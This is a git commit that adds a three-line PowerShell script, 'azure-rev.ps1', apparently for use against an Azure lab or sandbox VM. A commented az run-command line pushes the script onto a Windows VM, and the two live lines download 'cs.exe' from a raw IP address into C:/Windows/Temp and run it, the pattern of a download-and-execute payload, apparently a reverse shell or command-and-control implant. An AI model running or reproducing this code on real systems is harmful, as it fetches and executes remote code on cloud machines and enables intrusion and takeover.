d46de09919d2c48feda5f47a568d56cc43f9a70e
secureprogrammingforweb <119577671+secureprogrammingforweb@users.noreply.github.com>
2022-12-08 14:57:21 +0000

    Create azure-rev.ps1

---
+++ azure-rev.ps1
@@ -0,0 +1,3 @@
+# az run-command invoke  --command-id RunPowerShellScript --name win-vm -g 1-c2778e1b-playground-sandbox --scripts @run.ps1
+wget http://34.245.22.102/cs.exe -O C:/Windows/Temp/run.exe
+C:/Windows/Temp/run.exe
